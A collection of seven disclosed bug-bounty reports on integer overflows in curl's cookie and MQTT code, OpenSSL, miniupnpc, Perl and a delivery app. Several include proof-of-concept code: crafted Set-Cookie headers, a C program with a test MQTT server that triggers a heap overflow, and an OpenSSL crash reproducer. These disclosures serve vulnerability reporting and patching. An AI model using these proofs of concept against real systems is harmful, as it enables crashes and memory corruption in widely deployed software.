# Integer Overflow

_7 reports — High/Critical, disclosed_

### [Cookie Max-Age Integer Overflow Vulnerability](https://hackerone.com/reports/3516186)

- **Report ID:** `3516186`
- **Severity:** Critical
- **Weakness:** Integer Overflow
- **Program:** curl
- **Reporter:** @bhaskar_ram
- **Bounty:** - usd
- **Disclosed:** 2026-01-19T11:50:14.091Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The cookie parsing code in `lib/cookie.c` contains an integer overflow vulnerability when processing the `Max-Age` attribute of HTTP cookies. The vulnerable code attempts to add the max-age value to the current timestamp without adequate overflow protection

While the code includes an overflow check (`CURL_OFF_T_MAX - now < co->expires`), this check itself can experience integer overflow in edge cases where:
1. The `max-age` value is extremely large (near `CURL_OFF_T_MAX`)
2. The current time (`now`) is large enough that the subtraction `CURL_OFF_T_MAX - now` produces unexpected results
3. The addition `co->expires += now` occurs without proper bounds checking

An attacker can exploit this vulnerability by:
1. Controlling a web server or performing a man-in-the-middle attack
2. Sending HTTP responses with `Set-Cookie` headers containing extremely large `Max-Age` values
3. Causing curl/libcurl to incorrectly calculate cookie expiration times
4. Resulting in cookies persisting beyond their intended lifetime or being immediately expired

**Vulnerable Code Location:** `lib/cookie.c:607-611`

```c
else if(CURL_OFF_T_MAX - now < co->expires)
    /* would overflow */
    co->expires = CURL_OFF_T_MAX;
else
    co->expires += now;
```

## Affected version
**Affected Versions:** curl 7.x - 8.x

## Steps To Reproduce:

### Vulnerable Code Flow

1. **Cookie Header Parsing** (`parse_cookie_header()`)
   - Parses `Max-Age` attribute from `Set-Cookie` header
   - Calls `curlx_str_number()` to convert string to integer
   - Handles overflow cases but with insufficient protection

2. **Overflow Check** (Line 607)
   ```c
   if(CURL_OFF_T_MAX - now < co->expires)
   ```
   - This check can itself overflow when `now` is large
   - Does not account for all edge cases

3. **Time Addition** (Line 611)
   ```c
   co->expires += now;
   ```
   - Performs addition without verifying result
   - Can wrap around on overflow

### Exploitation Scenarios

#### Scenario 1: Maximum Max-Age Value
```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123; Max-Age=9223372036854775807; Path=/
```
- Max-Age set to `CURL_OFF_T_MAX` (64-bit maximum)
- When added to current time, may overflow
- Cookie may expire immediately or persist indefinitely

#### Scenario 2: Near-Overflow Value
```http
HTTP/1.1 200 OK
Set-Cookie: tracking=xyz; Max-Age=9223372036854000000; Path=/
```
- Max-Age chosen to overflow when added to `time(NULL)`
- Bypasses overflow check due to edge case
- Results in incorrect expiration calculation

#### Scenario 3: Cookie Jar Pollution
```http
HTTP/1.1 200 OK
Set-Cookie: cookie1=val; Max-Age=9223372036854775807
Set-Cookie: cookie2=val; Max-Age=9223372036854775806
Set-Cookie: cookie3=val; Max-Age=9223372036854775805
... (repeated many times)
```
- Multiple cookies with overflow values
- Fills cookie jar with persistent cookies
- Causes denial of service

---

### PoC Server

A malicious HTTP server has been developed to demonstrate the vulnerability:

**File:** `poc_cookie_overflow.py`

```bash
# Run the PoC server
python3 poc_cookie_overflow.py

# Server starts on http://localhost:8000
# Provides 4 different exploit scenarios
```

### Testing Steps

#### Test 1: Maximum Max-Age Value
```bash
# Test with vulnerable curl
curl -c cookies.txt http://localhost:8000/exploit1

# Examine cookie file
cat cookies.txt

# Expected (vulnerable): Cookie with incorrect expiration
# Expected (patched): Cookie capped at 400 days
```

#### Test 2: Near-Overflow Value
```bash
curl -c cookies.txt http://localhost:8000/exploit2
cat cookies.txt

# Check if overflow occurred
python3 -c "
import time
with open('cookies.txt') as f:
    for line in f:
        if 'near_overflow' in line:
            parts = line.split()
            expiry = int(parts[4])
            now = int(time.time())
            print(f'Expiry: {expiry}')
            print(f'Now: {now}')
            print(f'Diff: {expiry - now} seconds')
            print(f'Days: {(expiry - now) / 86400} days')
"
```

#### Test 3: Negative Max-Age
```bash
curl -c cookies.txt http://localhost:8000/exploit3
cat cookies.txt

# Verify cookie was expired immediately
```

#### Test 4: Cookie Jar Pollution
```bash
curl -c cookies.txt http://localhost:8000/exploit4
wc -l cookies.txt

# Should show 10+ cookies with overflow values
```

## Supporting Material/References:

- [RFC 6265 - HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265)
- [RFC 6265bis - Cookies (Draft)](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis)
- [CWE-190: Integer Overflow or Wraparound](https://cwe.mitre.org/data/definitions/190.html)
- [curl Security Policy](https://curl.se/docs/security.html)


  * [attachment / reference]

Attached PoC, patch files

## Impact

## Summary:
   - Attacker-set session cookies persist beyond intended lifetime
   - Users remain logged in indefinitely
   - Session tokens cannot be properly expired
   - Tracking cookies persist longer than allowed
   - User privacy preferences bypassed
   - GDPR/privacy regulation violations
   - Authentication cookies may expire immediately
   - Or persist indefinitely, preventing logout
   - Access control mechanisms compromised
   - Malformed cookies fill up cookie storage
   - Legitimate cookies may be evicted
   - Application functionality degraded

---

### [integer Overflow in MQTT Protocol Handling Allows Bypassing Message Size Limit](https://hackerone.com/reports/3508500)

- **Report ID:** `3508500`
- **Severity:** High
- **Weakness:** Integer Overflow
- **Program:** curl
- **Reporter:** @gudyuu
- **Bounty:** - usd
- **Disclosed:** 2026-01-13T12:23:44.362Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A logic error involving an integer overflow (specifically, an unsigned integer underflow) exists in the lib/mqtt.c file within the mqtt_publish function. This vulnerability allows an attacker (or a malicious user configuration) to bypass the explicit MAX_MQTT_MESSAGE_SIZE check.

The vulnerability occurs when curl calculates whether an MQTT packet exceeds the maximum allowed size ( 0xFFFFFFF or ~268 MB). The validation logic performs a subtraction operation using the payload length before verifying if the payload is already too large. If the payload length exceeds the maximum size, the subtraction wraps around (underflows) to a large positive value, causing the safety check to pass incorrectly.

This leads to curl attempting to allocate a massive amount of memory and sending a packet that violates the intended protocol constraints defined in the source code.


## Vulnerable code
https://github.com/curl/curl/blob/master/lib/mqtt.c#L533
https://github.com/curl/curl/blob/master/lib/mqtt.c#L563-L568

## Affected version
current (8.18.0)

## Steps To Reproduce:
To reproduce this issue, we need  MQTT server to accept the connection and a C program using libcurl to send a payload larger than MAX_MQTT_MESSAGE_SIZE .

1.MQTT Server ( mqtt_server.py )
```
import socket
import struct
import sys
import time

def run_server():
    host = '127.0.0.1'
    port = 1883
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(1)
    
    print(f"Listening on {host}:{port}")
    sys.stdout.flush()
    
    conn, addr = sock.accept()
    print(f"Connection from {addr}")
    sys.stdout.flush()
    
    try:
        # Read CONNECT packet
        # Just read some bytes
        data = conn.recv(1024)
        print(f"Received CONNECT: {len(data)} bytes")
        sys.stdout.flush()
        
        # Send CONNACK
        # Fixed header: 0x20, Remaining Length: 0x02
        # Variable header: Connect Acknowledge Flags: 0x00, Connect Return Code: 0x00 (Accepted)
        connack = b'\x20\x02\x00\x00'
        conn.sendall(connack)
        print("Sent CONNACK")
        sys.stdout.flush()
        
        # Now expect PUBLISH
        # Read the first few bytes to see the length
        head = conn.recv(5)
        if not head:
            print("Client disconnected immediately")
            return

        print(f"Received head: {head.hex()}")
        sys.stdout.flush()
        
        # We expect a huge packet if the vulnerability works
        
        received = len(head)
        start_time = time.time()
        
        while True:
            chunk = conn.recv(65536)
            if not chunk:
                break
            received += len(chunk)
            if time.time() - start_time > 1:
                print(f"Received {received} bytes...", end='\r')
                sys.stdout.flush()
                start_time = time.time()
                
        print(f"\nTotal received: {received} bytes")
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()
        sock.close()

if __name__ == '__main__':
    run_server()
```
2.  Exploit Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

int main(void)
{
    CURL *curl;
    CURLcode res;

    
    setenv("ASAN_OPTIONS", "detect_leaks=0", 1);

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "mqtt://127.0.0.1:1883/topic");
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        /* use payload bigger than MAX_MQTT_MESSAGE_SIZE (~268MB) */
        const curl_off_t huge_size = (curl_off_t)300 * 1024 * 1024;
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, huge_size);

  
        char *buf = (char *)calloc(1, 1024);
        if(!buf) {
            fprintf(stderr, "Failed to allocate small buffer\n");
            return 1;
        }
        memset(buf, 'A', 1024);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);

        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

        printf("ASAN PoC: attempting to send %lld bytes to MQTT...\n",
               (long long)huge_size);
        res = curl_easy_perform(curl);

        if(res == CURLE_OK) {
            printf("[ASAN] Transfer succeeded -> limit bypass confirmed.\n");
        }
        else if (res == CURLE_TOO_LARGE || res == CURLE_FILESIZE_EXCEEDED) {
            printf("[ASAN] Transfer blocked by size limit.\n");
        }
        else {
            printf("[ASAN] Transfer failed: %d (%s)\n", res, curl_easy_strerror(res));
        }

        free(buf);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return 0;
}
```

## Ouput
1. MQTT Server ( mqtt_server.py )
```
Listening on 127.0.0.1:1883
Connection from ('127.0.0.1', 51950)
Received CONNECT: 26 bytes
Sent CONNACK
Client disconnected immediately
```
2. POC ouput
```
ASAN PoC: attempting to send 314572800 bytes to MQTT...
*   Trying 127.0.0.1:1883...
* Connected to 127.0.0.1 (127.0.0.1) port 1883
* Using client id 'curlzeT6w484'
> MQTT<
       curlzeT6w484* mqtt_doing: state [0]
* mqtt_doing: state [0]
<  < * mqtt_doing: state [2]
< =================================================================
==10341==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x619000002780 at pc 0x000105765c88 bp 0x00016aff1710 sp 0x00016aff0eb0
READ of size 314572800 at 0x619000002780 thread T0
    #0 0x000105765c84 in memcpy+0x284 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x85c84)
    #1 0x00019afb4d58 in mqtt_publish+0x130 (libcurl.4.dylib:arm64e+0x38d58)
    #2 0x00019afb4674 in mqtt_doing+0x154 (libcurl.4.dylib:arm64e+0x38674)
    #3 0x00019afb71c4 in multi_runsingle+0x258 (libcurl.4.dylib:arm64e+0x3b1c4)
    #4 0x00019afb6ebc in curl_multi_perform+0xc8 (libcurl.4.dylib:arm64e+0x3aebc)
    #5 0x00019af911b8 in curl_easy_perform+0x10c (libcurl.4.dylib:arm64e+0x151b8)
    #6 0x000104e0c990 in main poc_asan.c:42
    #7 0x000181126b94  (<unknown module>)

0x619000002780 is located 0 bytes after 1024-byte region [0x619000002380,0x619000002780)
allocated by thread T0 here:
    #0 0x00010571d620 in calloc+0x80 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x3d620)
    #1 0x000104e0c8d4 in main poc_asan.c:30
    #2 0x000181126b94  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow (libcurl.4.dylib:arm64e+0x38d58) in mqtt_publish+0x130
Shadow bytes around the buggy address:
  0x619000002500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x619000002700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x619000002780:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x619000002a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==10341==ABORTING

## Impact

1. Applications using libcurl MQTT can crash or abort if they set CURLOPT_POSTFIELDSIZE_LARGE to a very large value but provide a small CURLOPT_POSTFIELDS buffer, ASAN confirms an out-of-bounds read.
2. Failing to enforce size limits via a correct comparison allows attackers or misconfigurations to force libcurl to process oversized payloads. The flawed check is a classic unsigned wraparound (CWE-190).

---

### [MQTT Protocol Violation & Integer Overflow in libcurl](https://hackerone.com/reports/3484319)

- **Report ID:** `3484319`
- **Severity:** High
- **Weakness:** Integer Overflow
- **Program:** curl
- **Reporter:** @ssyyaa
- **Bounty:** - usd
- **Disclosed:** 2026-01-01T22:50:02.911Z
- **CVE(s):** -

**Vulnerability Information:**

## Executive Summary

**Vulnerability Type:** CWE-190
**Component:** lib/mqtt.c  
**Function:** mqtt_decode_len  

**Affected Architectures:**
- **All architectures:** Protocol non-compliance leading to stream desynchronization
- **32-bit architectures:** Deterministic integer overflow in length decoding

libcurl does not correctly enforce the MQTT v3.1.1 specification limit for the “Remaining Length” field when decoding incoming packets. This allows malformed MQTT packets to be parsed incorrectly, leading to protocol desynchronization and potential denial of service. On 32-bit systems, the decoding logic additionally allows a deterministic integer overflow.

---

## Root Cause: Inconsistent Length Handling

The issue is caused by an inconsistency within `lib/mqtt.c`.  
The encoder correctly enforces the MQTT specification limit, while the decoder does not.

### Correct Behavior (Encoding)

In `mqtt_encode_len`, the implementation explicitly limits the Remaining Length field to four bytes, as required by the specification:

```c
for(i = 0; (len > 0) && (i < 4); i++) {
  unsigned char encoded;
  encoded = len % 0x80;
  /* ... */
}
````

This ensures protocol compliance.

### Incorrect Behavior (Decoding)

In contrast, `mqtt_decode_len` does not enforce the same limit:

```c
for(i = 0; (i < buflen) && (encoded & 128); i++) {
  encoded = buf[i];
  len += (encoded & 127) * mult;
  mult *= 128;
}
```

The loop continues as long as the continuation bit is set and input is available, allowing more than four bytes to be consumed as part of the Remaining Length field.

---

## Specification Violation

According to the MQTT v3.1.1 specification, Section 2.2.3 (Remaining Length):

> “The number of bytes in the Remaining Length field MUST NOT exceed four bytes.”

By accepting and processing length fields longer than four bytes, libcurl violates the MQTT specification and enters an undefined protocol state.

---

## Integer Overflow on 32-bit Systems

On 32-bit architectures, `size_t` is a 32-bit unsigned integer.
The variable `mult` is repeatedly multiplied by 128 during decoding.

Example progression on a 32-bit system:

| Iteration | mult value  | Operation | Result           |
| --------: | ----------- | --------- | ---------------- |
|         0 | 1           | 1 × 128   | 128              |
|         1 | 128         | 128 × 128 | 16,384           |
|         2 | 16,384      | × 128     | 2,097,152        |
|         3 | 2,097,152   | × 128     | 268,435,456      |
|         4 | 268,435,456 | × 128     | **Overflow → 0** |

After the overflow, `mult` becomes zero, and any further bytes consumed contribute nothing to the decoded length. This allows a large or malformed Remaining Length field to be partially “hidden” while still advancing the input pointer.

---

## Impact

# Impact

### Protocol Desynchronization (All Architectures)

By consuming more than four bytes for the Remaining Length field, libcurl can become desynchronized from the MQTT stream. Bytes intended to be part of the payload or subsequent packets may instead be interpreted as length data, causing incorrect parsing of later packets.

### Denial of Service

This desynchronization can result in malformed packet handling, unexpected connection termination, or repeated protocol errors such as `CURLE_WEIRD_SERVER_REPLY`.

No memory corruption or code execution is claimed.

---

## Recommended Fix

The decoding logic should explicitly enforce the four-byte limit defined by the MQTT specification.

Example fix:

```c
for(i = 0; (i < buflen) && (encoded & 128); i++) {
  if(i >= 4) {
    /* Malformed Remaining Length */
    return 0; /* or propagate an error to the caller */
  }
  encoded = buf[i];
  len += (encoded & 127) * mult;
  mult *= 128;
}
```

Optionally, the decoded length can also be checked against the implementation limit:

```c
if(len > MAX_MQTT_MESSAGE_SIZE)
  return 0;
```

---

## Verification Notes

The issue was verified through code inspection and logic simulation, confirming that `mqtt_decode_len` accepts more than four bytes for the Remaining Length field and allows arithmetic overflow on 32-bit systems. Runtime exploitation was not required to demonstrate the protocol violation.

---

## Conclusion

This is a protocol parsing bug caused by missing enforcement of a mandatory MQTT specification limit. While it does not directly result in memory corruption, it allows malformed MQTT packets to desynchronize the client’s protocol state and cause denial of service. Aligning the decoder with the existing encoder logic resolves the issue cleanly.

```

---

### [Integer overflow vulnerability ](https://hackerone.com/reports/1562515)

- **Report ID:** `1562515`
- **Severity:** Critical
- **Weakness:** Integer Overflow
- **Program:** Glovo
- **Reporter:** @0f1c3r
- **Bounty:** - usd
- **Disclosed:** 2022-05-17T13:46:07.559Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
In one of my previous reports i send parameter tampering report vulnerability. Then you asked me to send PoC and you just closed it, that's why i'm sending you this new report with exactly name of vulnerability. Integer Overflows are closely related to other conditions that occur when manipulating integers. An Integer Overflow is the condition that occurs when the result of an arithmetic operation, such as multiplication or addition, exceeds the maximum size of the integer type used to store it. When an integer overflow occurs, the interpreted value will appear to have “wrapped around” the maximum value and started again at the minimum value. For example, an 8-bit signed integer on most common computer architectures has a maximum value of 127 and a minimum value of -128. If a programmer stores the value 127 in such a variable and adds 1 to it, the result should be 128. However, this value exceeds the maximum for this integer type, so the interpreted value will “wrap around” and become -128. 

Attackers can use these conditions to influence the value of variables in ways that the programmer did not intend. The security impact depends on the actions taken based on those variables. Examples include, but are certainly not limited, to the following:

    An integer overflow during a buffer length calculation can result in allocating a buffer that is too small to hold the data to be copied into it. A buffer overflow can result when the data is copied.

    When calculating a purchase order total, an integer overflow could allow the total to shift from a positive value to a negative one. This would, in effect, give money to the customer in addition to their purchases, when the transaction is completed.

    Withdrawing 1 dollar from an account with a balance of 0 could cause an integer underflow and yield a new balance of 4,294,967,295.

    A very large positive number in a bank transfer could be cast as a signed integer by a back-end system. In such case, the interpreted value could become a negative number and reverse the flow of money - from a victim's account into the attacker's.

## Steps To Reproduce:
Beside card payment, you have option "cache on delivery" and there i found one mistake which gives me possibility to change price in last moment.. The moment when you actually should change quantity value is: 



## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

Integer overflow, quantity value manipulation leads to price manipulation..

---

### [Integer overflow in CipherUpdate](https://hackerone.com/reports/1113025)

- **Report ID:** `1113025`
- **Severity:** High
- **Weakness:** Integer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @reaperhulk
- **Bounty:** - usd
- **Disclosed:** 2021-04-08T03:55:44.706Z
- **CVE(s):** CVE-2021-23840, CVE-2020-36242

**Vulnerability Information:**

## Summary:
I reported an integer overflow to the OpenSSL security list on Dec 13, 2020 and it was fixed in OpenSSL 1.1.1j. Reporting it here for the bounty. It was assigned CVE-2021-23840 (https://nvd.nist.gov/vuln/detail/CVE-2021-23840) which NVD rated CVSS 7.5. Amusingly, the same bug (worked around by my library pyca/cryptography before 1.1.1j was released) was assigned CVE-2020-36242 (https://nvd.nist.gov/vuln/detail/CVE-2020-36242), which received a 9.1 CVSS from NVD.

## Steps To Reproduce:
The below is a reproducer for prior to 1.1.1j.
```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <openssl/evp.h>

int main() {
    int res;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    assert(ctx != NULL);
    unsigned char key[] = "0000000000000000";
    unsigned char iv[] = "0000000000000000";
    res = EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, 1);
    assert(res == 1);
    int intmax = 2147483647;
    void *inbuf = malloc(intmax);
    void *outbuf = malloc((size_t)2147483648);
    int outlen = 0;
    unsigned char data[] = "0";
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, data, 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", 1, outlen, res);
    assert(res == 1);
    outlen = 0;
    res = EVP_CipherUpdate(ctx, outbuf, &outlen, (unsigned char
*)inbuf, intmax);
    assert(res == 1);
    printf("Processed %i bytes, outlen: %i, res: %i\n", intmax, outlen, res);
}
```

## Impact

This returned negative output length, which, when combined with common use of pointer arithmetic in buffers results in accessing incorrect regions of memory (typically this would manifest as a segfault due to the size of the negative value, but that is not guaranteed).

---

### [CVE-2017-8798 - miniupnp getHTTPResponse chunked encoding integer signedness error](https://hackerone.com/reports/227344)

- **Report ID:** `227344`
- **Severity:** High
- **Weakness:** Integer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @hxd
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:48:49.780Z
- **CVE(s):** CVE-2017-8798

**Vulnerability Information:**

### Integer signedness error in miniupnpc [1]  allows remote attackers to cause a denial of service condition (access violation and heap corruption) via specially crafted HTTP response

An integer signedness error was found in miniupnp's `miniwget` allowing 
an unauthenticated remote entity typically located on the
local network segment to trigger a heap corruption or an access violation
in miniupnp's http response parser when processing a specially crafted
chunked-encoded response to a request for the xml root description url.

* affects
 * all versions >= `v1.4.20101221` (released 21/12/2010; `~6 years ago`)
 * all configurations as its a core part of the library
* impact
 * DoS (access violation due to buffer overread memcpy)
 * Heap Overwrite (pot. race RCE in multithreaded envs)
* requirements
  * no user interaction, unauth, low complexity
* how widespread is this software?
 * miniupnpc is compiled into a wide range of network applications and embedded device firmware.
 * blockchain clients: `bitcoind` and almost all forks, `CPP ethereum`, ...
 * p2p filesharing applications: `qBittorrent`, `Transmission`, ...
 * network device firmware: `dlink`, `linksys`, probably `synology` or anything that allows IGD management / portforwarding
 * numerous hits for `miniwget` on google or github.  closed source obviously not included but its likely to find this lib packed with embedded devices.
* disclosure
 * provided detailed description, PoC and patch
 * status: fixed; within 8 days.

The vulnerable component is a HTTP file download method called 
`miniwget` (precisely `getHTTPResponse`) that fails to properly handle 
invalid chunked-encoded HTTP responses. The root cause is a bounds check
that mistakenly casts an unsigned attacker-provided chunksize to signed 
int leading to an incorrect decision on the destination heap buffer size 
when copying data from the server response to an internal buffer. The 
attacker controls both the size of the internal buffer as well as the 
number of bytes to copy. In order for this attack to succeed, the number 
of bytes to copy must be negative.

attacker controls:
* `int content_length`
* `unsigned int chunksize`
* `bytestocopy` if `(int) chunksize` is negative (or at least < `n-i` ~ 1900 bytes)
* length of `content_buf` if `bytestocopy` is negative

In the end, the attacker has almost full control of the following two methods
* `realloc(content_buf, content_length)`
* `memcpy(content_buf+x, http_response, chunksize)`


affected methods (almost all exposed API):

        basically all `miniwget*` and `UPNP_*` methods.
        * getHTTPResponse (vulnerable)
          * miniwget3
           * miniwget2
            * miniwget
            * miniwget_getaddr
             * UPNP_GetIGDFromUrl
             * UPNP_GetValidIGD
              * UPnP_selectigd
          * UPNP_Get*
          * UPNP_Check*
          * UPNP_Delete*
          * UPNP_Update*
          * UPNP_Add*


This vulnerability is easily exploitable with an attacker being on the same network segment/multicast domain by answering SSDP discovery requests (1) (or sending notification requests) providing an URL to the attacker controlled webserver. Answering this request (2) makes upnp clients download a description file from that webserver (3)(4) in order to learn more about the capabilities of the Internet Gateway Device (IGD). By providing a negative chunk length in the chunked-encoded answer (4) to this request the malicious webserver triggers the vulnerability. This way one malicous client could exploit all other clients in the same multicast domain. (Funny sidenote: I had to implement a target ip filter otherwise the PoC would attract devices like a magnet and crash all of them)

```
      client (miniupnpc)                         server (poc.py)
          |                                         |
          |                                         |
          | SSDP:  Discovery - M-SEARCH             |
      1.  | --------------------------------------> |
          |                                         |
          | SSDP:  Reply - Location Header          |
      2.  | <-------------------------------------- |
          |                                         |
          | SCPD:  GET (Location Header/xxxx.xml)   |
      3.  | --------------------------------------> |
          |                                         |
          | SCPD:  HTTP chunked-encoded reply       |
      4.  | <-------------------------------------- |
          |                                         |

```
*Note*: the vulnerability is basically not bound to the adjacent network since `miniwget` could also be used to download arbitrary files on the internet. This is just the most common/typical vector, otherwise the CVSS score would be higher.

##### Disclosure

coordinated disclosure and reported to the miniupnp project owner, provided `detailed vulnerability analysis`, a one-click exploit all `PoC` and a minimal `patch`. The patch was accepted with minor changes. Fixed within a few days of first contact (May 1st ->May 9th). 

details and the actual research material that was securely shared with the miniupnp project is going to be be pushed to the following github repository once vendors picked up the changes: https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798

Vendor response [2] and Patch [3]

❤ Thanks to miniupnp for treating this with priority. 

  [1] http://miniupnp.free.fr
  [2] http://miniupnp.free.fr/files/changelog.php?file=miniupnpc-2.0.20170509.tar.gz
  [3] https://github.com/miniupnp/miniupnp/commit/f0f1f4b22d6a98536377a1bb07e7c20e4703d229

---

### [Integer overflow leading to buffer overflow](https://hackerone.com/reports/424447)

- **Report ID:** `424447`
- **Severity:** Critical
- **Weakness:** Integer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @jkrshnmenon
- **Bounty:** - usd
- **Disclosed:** 2019-09-25T18:30:15.302Z
- **CVE(s):** CVE-2018-18311

**Vulnerability Information:**

There exists an integer overflow in Perl_my_setenv @ util.c : 2070

2070: void Perl_my_setenv(pTHX_ const char *nam, const char *val) {
...
2166:         const int nlen = strlen(nam);
...
2171:         vlen = strlen(val);
2172:         new_env = (char*)safesysmalloc((nlen + vlen + 2) * sizeof(char));

Here in a 64 bit version of Perl, since the arguments `nam` and `val` are user controlled, the 32 bit integers `nlen` and `vlen` are also under the control of the attacker. Therefore, if `nam` and `val` are two very long strings (for example, 2147483647 bytes long), the addition at line 2172 would result in an integer overflow.

The `new_env` would therefore be a chunk of a size which is smaller than the sum of the lengths of the two input strings.

This `new_env` is subsequently used in a call to `memcpy` to copy `nlen` bytes from `nam` followed by `vlen` bytes from `val`.

This results in a buffer overflow on the heap with attacker controlled input.

Please find attached a PoC which demonstrates the buffer overflow. Please note that the attached PoC consumes large amounts of memory and results in a segmentation fault on a 64 bit Ubuntu 16.04 system running a 64 bit version of perl.
This segmentation fault occurs due to the fact that the `memcpy` tries to write outside the initial heap boundary.

This vulnerability has been recognised as a serious security issue and has been assigned the identifier CVE-2018-18311 by the developers.

## Impact

Memory corruption with attacker controlled input which can lead to arbitrary code execution

---
